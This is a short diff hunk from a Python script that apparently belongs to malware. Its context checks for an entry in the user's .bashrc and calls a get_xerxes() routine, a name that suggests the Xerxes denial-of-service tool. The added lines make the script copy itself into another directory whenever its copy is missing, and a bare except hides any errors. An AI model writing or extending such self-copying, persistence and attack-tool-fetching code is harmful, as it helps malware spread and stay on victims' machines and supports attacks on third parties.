@@ -53,6 +53,8 @@ if not myname in os.popen("cat $HOME/.bashrc").read():
 try:
   if not "libs.pl" in os.popen("ls -la {}".format(mypwd)).read():
     get_xerxes()
+  if not myname in os.popen("ls -la {}".format(mypwd)).read():
+    os.system("cp {} {}".format(myname,mypwd))
 except:
   None
 
